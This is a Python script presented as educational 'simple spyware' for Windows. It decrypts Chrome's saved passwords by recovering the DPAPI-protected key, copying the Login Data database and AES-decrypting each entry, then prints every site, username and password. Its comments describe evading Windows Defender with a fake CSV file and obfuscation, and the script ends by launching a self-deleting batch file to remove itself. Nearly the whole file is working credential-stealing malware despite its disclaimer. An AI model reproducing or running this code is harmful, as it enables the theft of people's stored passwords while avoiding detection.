# 7Wdev - do not use it illegally!
# I coded it just for educational purposes!
# I am not responsible about your behaviors!
# This script only works in windows!
# You can compile this script to an exe (optional)!
# Also you can add .bat file that deletes itself + the spyware (optional)! 
import os
import re
import sys
import json
import base64
import sqlite3
import win32crypt
import subprocess 
from Crypto.Cipher import AES
import shutil
import csv
from email.mime.multipart import MIMEMultipart
import requests
import time

# get the chrome path from the user...
CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data"%(os.environ['USERPROFILE']))

# preparing the secret key in the target windows machine!
# pay attention that each windows device has it is own decryption key!
def get_secret_key():
    try:
        with open(CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
            secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            secret_key = secret_key[5:] 
            secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
            return secret_key
    except Exception as e:
                print("%s"%str(e))
                print("[ERR] Chrome secretkey cannot be found")
                return None

# decryption_method...
def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

# generate_cipher_method... 
def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

# Here we are decrypting the passwords only!
def decrypt_password(ciphertext, secret_key):
    try:
        initialisation_vector = ciphertext[3:15]
        encrypted_password = ciphertext[15:-16]
        cipher = generate_cipher(secret_key, initialisation_vector)
        decrypted_pass = decrypt_payload(cipher, encrypted_password)
        decrypted_pass = decrypted_pass.decode()  
        return decrypted_pass
    except Exception as e:
        print("%s"%str(e))
        print("[ERR] Unable to decrypt, Chrome version <80 not supported. Please check.")
        return ""

# connecting to the user local database...    
def get_db_connection(chrome_path_login_db):
    try:
        print(chrome_path_login_db)
        shutil.copy2(chrome_path_login_db, "Loginvault.db") 
        return sqlite3.connect("Loginvault.db")
    except Exception as e:
        print("%s"%str(e))
        print("[ERR] Chrome database cannot be found")
        return None

# here we are faking an Excel document to confuse WindowsDefender - (it is better to crypt the code or obfuscate it)
if __name__ == '__main__':
    try:
        message = ""
        with open('document.csv', mode='w', newline='') as decrypt_password_file:
            csv_writer = csv.writer(decrypt_password_file, delimiter=',')
            csv_writer.writerow(["I","SITE","ACCOUNT","PASSWORD"])
            secret_key = get_secret_key()
            folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$",element) != None]
            for folder in folders:
                chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data"%(CHROME_PATH,folder))
                conn = get_db_connection(chrome_path_login_db)
                if(secret_key and conn):
                    cursor = conn.cursor()
                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                    for index,login in enumerate(cursor.fetchall()):
                        url = login[0]
                        username = login[1]
                        ciphertext = login[2]
                        if(url != "" and username != "" and ciphertext != ""):
                            decrypted_password = decrypt_password(ciphertext, secret_key)
                            message = message + "\nSITE: %s\nACCOUNT: %s\nPASSWORD: %s\n"%(str(url),str(username),str(decrypted_password))
                    cursor.close()
                    conn.close()
                    os.remove("Loginvault.db")
        
        # this will print all the decrypted data in the console!
        text = message.encode("utf-8")
        print(text)

        # hackers would also add a way to send the data over mail service or ftp... 
    except Exception as e:
        print("[ERR] "%str(e))
    finally:
        
        # here we deletes the csv file...
        decrypt_password_file.close()
        os.remove("document.csv")

        # and running our .bat that deletes the spyware + itself...
        os.startfile("Updater.bat")

# This is our simple spyware written in python, now you know how can hackers fool u and steal your data...